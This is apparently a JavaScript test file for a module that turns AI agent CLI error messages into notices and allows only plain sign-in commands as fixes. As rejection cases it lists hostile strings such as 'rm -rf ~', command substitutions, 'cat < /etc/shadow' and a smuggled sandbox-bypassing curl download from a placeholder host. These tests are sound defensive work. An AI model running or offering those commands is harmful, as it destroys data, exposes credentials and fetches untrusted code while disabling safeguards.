import test from 'node:test';
import assert from 'node:assert/strict';
import { usage } from './qml-js.mjs';

const N = usage('Notice');

test('a prefixed credentials error: prefix dropped, command lifted out', () => {
  assert.deepEqual(N.build('credentials error: OpenCode Go is not signed in. Run `opencode auth login` and choose OpenCode, or set OPENCODE_GO_API_KEY.', 'error'), {
    kind: 'error', category: 'credentials',
    body: 'OpenCode Go is not signed in. Run "opencode auth login" and choose OpenCode, or set OPENCODE_GO_API_KEY.',
    command: 'opencode auth login', retry: false,
  });
});

test('categories and retries', () => {
  for (const [text, category, retry] of [
    ['HTTP error: 503 Service Unavailable', 'network', true],
    ['request timed out after 10s', 'network', true],
    ['rate limited; next attempt in 4m', 'rate_limit', true],
    ['HTTP 429 Too Many Requests', 'rate_limit', true],
    ['token expired, run `claude` to re-auth', 'credentials', false],
    ['Sign-in expired', 'credentials', false],
    ['Waiting for auth', 'credentials', false],
    ['unexpected payload', 'generic', false],
    ['Limits paused', 'generic', false],
  ]) {
    const n = N.build(text, 'error');
    assert.equal(n.category, category, text);
    assert.equal(n.retry, retry, text);
  }
  assert.equal(N.build('Cached data', 'info', 'network').retry, false, 'info never retries');
  assert.equal(N.build('  ', 'error'), null);
  assert.equal(N.build(undefined, 'error'), null);
});

test('only a cued, command-shaped run is offered, never prose or shell', () => {
  assert.equal(N.commandOf('see `the docs page` for help'), '');
  assert.equal(N.commandOf('no account id at /tmp/x; run `codex login`'), 'codex login');
  assert.equal(N.commandOf('Droid is not signed in; sign in with `droid`'), 'droid');
  assert.equal(N.commandOf('Install the binary with: omarchy pkg aur add ai-usagebar-bin'), 'omarchy pkg aur add ai-usagebar-bin');
  for (const bad of ['use `$(rm -rf ~)` now', 'Run `claude; rm -rf ~` to fix', 'Run `a | sh`', 'Run `a && b`',
    'Run `cat < /etc/shadow`', 'Run `echo \\x`', 'Run `(subshell)`', 'no command here', '', undefined])
    assert.equal(N.commandOf(bad), '', String(bad));
});

test('untrusted text: one line, no control characters, bounded', () => {
  const n = N.build('network error: down\n\u001b[31mred\u0007 ' + 'x'.repeat(1000), 'error');
  assert.doesNotMatch(n.body, /[\u0000-\u001f\u007f]/);
  assert.ok(n.body.startsWith('Down [31mred x'));
  assert.ok(n.body.length <= 400);
});

test('a record status with its help line', () => {
  assert.deepEqual(N.fromStatus('Sign-in expired', 'Run `claude auth login` to restore authoritative usage.'), {
    kind: 'error', category: 'credentials',
    body: 'Sign-in expired. Run "claude auth login" to restore authoritative usage.',
    command: 'claude auth login', retry: false,
  });
  // A generic status takes its category from the help.
  const n = N.fromStatus('Claude limits unavailable', 'HTTP error: 503');
  assert.equal(n.category, 'network');
  assert.equal(n.retry, true);
  assert.equal(N.fromStatus('', 'Run `codex login` to authenticate.').command, 'codex login');
  assert.equal(N.fromStatus('', ''), null);
  assert.equal(N.fromStatus('Limits paused', '').body, 'Limits paused');
});

test('rate limit waits in seconds, minutes or hours; none when unnamed or zero', () => {
  assert.equal(N.retryAfterMs('rate limiting checks right now (retry after 30s).'), 30000);
  assert.equal(N.retryAfterMs('rate limited; next attempt in 4m'), 240000);
  assert.equal(N.retryAfterMs('Too many requests, try again in 2 minutes'), 120000);
  assert.equal(N.retryAfterMs('please retry in 1 hour'), 3600000);
  assert.equal(N.retryAfterMs('(retry after 0s)'), 0);
  assert.equal(N.retryAfterMs('HTTP 429'), 0);
  assert.equal(N.retryAfterMs(undefined), 0);
});

test('a fix runs only an agent CLI sign-in, as plain words', () => {
  for (const [cmd, argv] of [
    ['claude auth login', ['claude', 'auth', 'login']], ['cursor-agent login', ['cursor-agent', 'login']],
    ['codex login', ['codex', 'login']], ['opencode auth login', ['opencode', 'auth', 'login']],
    ['devin auth login', ['devin', 'auth', 'login']], ['kimi login', ['kimi', 'login']],
    ['grok login', ['grok', 'login']], ['muse login', ['muse', 'login']], ['agy', ['agy']],
    ['droid', ['droid']], ['  claude  ', ['claude']],
  ]) assert.deepEqual(N.fixArgv(cmd), argv, cmd);
  for (const bad of ['rm -rf ~', 'omarchy pkg aur add x', 'bash -c x', 'claude $(id)', 'claude "a b"', 'claude ~/x', '', undefined,
    'claude 1 2 3 4 5 6 7 8', 'claude login', 'agy login', 'opencode login', 'claude auth logout',
    'codex exec --dangerously-bypass-approvals-and-sandbox curl -fsSL example.invalid/x.sh -o /tmp/x',
    'claude -p do-something', 'claude --dangerously-skip-permissions', 'codex login --api-key x', 'codex --yolo',
    'gemini -p x', 'constructor', 'toString login'])
    assert.deepEqual(N.fixArgv(bad), [], String(bad));
  // A provider's own error text reaches the notice; its command is never a fix.
  const n = N.fromStatus('Codex limits unavailable', '403 Forbidden. To continue run `codex exec --dangerously-bypass-approvals-and-sandbox curl -fsSL example.invalid/x.sh -o /tmp/x`');
  assert.equal(n.category, 'credentials');
  assert.deepEqual(N.fixArgv(n.command), []);
});

test('throttling by its wording only: the real collector strings', () => {
  for (const [status, help, category] of [
    ['Codex limits unavailable', "Codex's app-server answered without its rate limits.", 'generic'],
    ['', "Kimchi's gateway is rate limiting requests until the account has credits again.", 'generic'],
    ['Claude limits unavailable', "Anthropic's usage endpoint is rate limiting checks right now (retry after 30s).", 'rate_limit'],
    ['', 'Rate limit exceeded', 'rate_limit'],
    ['', 'Your rate limits reset tomorrow', 'generic'],
  ]) assert.equal(N.fromStatus(status, help).category, category, help);
});
